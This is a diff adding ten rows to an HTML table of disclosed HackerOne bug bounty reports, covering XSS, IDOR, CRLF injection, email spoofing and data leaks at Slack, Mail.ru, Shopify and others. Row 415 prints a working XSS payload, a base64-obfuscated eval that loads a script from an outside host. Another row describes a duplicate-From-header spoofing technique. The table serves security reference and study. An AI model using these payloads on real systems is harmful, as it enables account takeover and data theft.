@@ -7068,7 +7068,219 @@
 </a>
 </td>
 </tr>
+<tr>
+<td class="numberingColumn confluenceTd">414
+</td>
+<td class="confluenceTd" colspan="1">Code injection
+</td>
+<td class="confluenceTd" colspan="1">XSS to RCE by uploading html as part of a snippet. The map-function allows arbitrary inclusion of resources, leading to being able to execute any command. There are also multiple issues with storage of payloads in Slack's environment, leading to being able to host code on trusted domains.
+</td>
+<td class="confluenceTd" colspan="1">$1750
+</td>
+<td class="confluenceTd" colspan="1">Slack
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/783877">https://hackerone.com/reports/783877
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd" colspan="1">415
+</td>
+<td class="confluenceTd" colspan="1">XSS
+</td>
+<td class="confluenceTd" colspan="1">Due to taking unsantizied input from websockets and rendering it on the recipients side, it is possible to achieve XSS on support desk conversations and gain access to support tickets and client information. The payload was: `
+<pre class="highlight javascript">
+<code>
+<span class="nx">ws
+</span>
+<span class="p">.
+</span>
+<span class="nx">send
+</span>
+<span class="p">(
+</span>
+<span class="dl" style="color: #dd1144;">'
+</span>
+<span class="s1" style="color: #dd1144;">{"action":"send_message","data":{"type":2,"uuid":"katO0xuiIy","media_thumb":"xxdata
+</span>
+<span class="se" style="color: #dd1144;">\\
+</span>
+<span class="s1" style="color: #dd1144;">" onerror=
+</span>
+<span class="se" style="color: #dd1144;">\\
+</span>
+<span class="s1" style="color: #dd1144;">"eval(atob(
+</span>
+<span class="se" style="color: #dd1144;">\'
+</span>
+<span class="s1" style="color: #dd1144;">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcGl0ci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7
+</span>
+<span class="se" style="color: #dd1144;">\'
+</span>
+<span class="s1" style="color: #dd1144;">));//","media_url":"media-url"},"uuid":"katO0xuiIy","token":"bz+OjfTeBL/BRozszXwKbT10voEb0crFVRWBktvQifQ=","projectId":1,"messengerType":9}
+</span>
+<span class="dl" style="color: #dd1144;">'
+</span>
+<span class="p">)
+</span>
 
+</code>
+</pre>`
+</td>
+<td class="confluenceTd" colspan="1">$500
+</td>
+<td class="confluenceTd" colspan="1">QiWi
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/512065">https://hackerone.com/reports/512065
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">416
+</td>
+<td class="confluenceTd" colspan="1">Improper authentication
+</td>
+<td class="confluenceTd" colspan="1">Due to improper parsing and display of the from address, it was possible to send emails from&nbsp;
+<a href="mailto:any&nbsp;@mail.ru">any&nbsp;@mail.ru
+</a>&nbsp;address while passing DKIM and DMARC verification, even though the email is spoofed. The bug happens when there are two "From" headers and the incorrect, but spoofed address is added as "From&lt;SPACE&gt;: &lt;address&gt;". This attack is also a replay-attack where you require a previously sent and verified email from the address provider.
+</td>
+<td class="confluenceTd" colspan="1">$150
+</td>
+<td class="confluenceTd" colspan="1">Mail.ru
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/731878">https://hackerone.com/reports/731878
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">417
+</td>
+<td class="confluenceTd" colspan="1">IDOR
+</td>
+<td class="confluenceTd" colspan="1">IDOR in dictor.mail.ru allowed an attacker to get any video information through GraphQL query
+</td>
+<td class="confluenceTd" colspan="1">$2500
+</td>
+<td class="confluenceTd" colspan="1">Mail.ru
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/924914">https://hackerone.com/reports/924914
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">418
+</td>
+<td class="confluenceTd" colspan="1">Information disclosure
+</td>
+<td class="confluenceTd" colspan="1">Config files were accessible for&nbsp;
+<span style="color: #000000;">
+<a href="http://warofdragons.my">warofdragons.my
+</a>.games, leaking database credentials and other information
+</span>
+</td>
+<td class="confluenceTd" colspan="1">$150
+</td>
+<td class="confluenceTd" colspan="1">Mail.ru
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/786609">https://hackerone.com/reports/786609
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">419
+</td>
+<td class="confluenceTd" colspan="1">CRLF injection
+</td>
+<td class="confluenceTd" colspan="1">
+<span style="text-decoration: none;">
+<a style="text-decoration: none;" href="https://hackerone.com/redirect?signature=f1508bf91dad0fc8aaa29a8119228a770ffae470&amp;url=http%3A%2F%2Fwww.starbucks.com%2Femail-prospectt">www.starbucks.com/email-prospectt
+</a>&nbsp;was vulnerable to CRLF injection allowing for header injection (for example injecting CORS headers) or HTTP response splitting, which can be further exploited.
+</span>
+</td>
+<td class="confluenceTd" colspan="1">$250
+</td>
+<td class="confluenceTd" colspan="1">Starbucks
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/858650">https://hackerone.com/reports/858650
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">420
+</td>
+<td class="confluenceTd" colspan="1">XSS
+</td>
+<td class="confluenceTd" colspan="1">It is possible to achieve stored XSS if an attacker can upload files using Active storage, by utilizing the proxy-functionality included in Ruby on Rails.
+</td>
+<td class="confluenceTd" colspan="1">$500
+</td>
+<td class="confluenceTd" colspan="1">Ruby on Rails
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/949513">https://hackerone.com/reports/949513
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">421
+</td>
+<td class="confluenceTd" colspan="1">XSS
+</td>
+<td class="confluenceTd" colspan="1">It was possible to achieve stored XSS in the Post title on Imgur. This was achieved using a standard `"&gt;&lt;svg` payload.
+</td>
+<td class="confluenceTd" colspan="1">$250
+</td>
+<td class="confluenceTd" colspan="1">Imgur
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/942859">https://hackerone.com/reports/942859
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">422
+</td>
+<td class="confluenceTd" colspan="1">Logic bug
+</td>
+<td class="confluenceTd" colspan="1">Email bypass for shopify accounts that did not have Shopify IDs. This allowed an attacker to exploit a flaw in the flow, allowing for taking over these accounts without any verification.
+</td>
+<td class="confluenceTd" colspan="1">$22,500
+</td>
+<td class="confluenceTd" colspan="1">Shopify
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/867513">https://hackerone.com/reports/867513
+</a>
+</td>
+</tr>
+<tr>
+<td class="numberingColumn confluenceTd">423
+</td>
+<td class="confluenceTd" colspan="1">Information leak
+</td>
+<td class="confluenceTd" colspan="1">Anonymous access to a Sidekiq process dashboard was possible on
+<span style="color: #000000;">
+<span>&nbsp;
+</span>
+<a href="http://shopper.sbermarket.ru">shopper.sbermarket.ru
+</a>
+</span>
+</td>
+<td class="confluenceTd" colspan="1">$500
+</td>
+<td class="confluenceTd" colspan="1">Mail.ru
+</td>
+<td class="confluenceTd" colspan="1">
+<a href="https://hackerone.com/reports/951190">https://hackerone.com/reports/951190
+</a>
+</td>
+</tr>
 
 </tbody>
 </table>
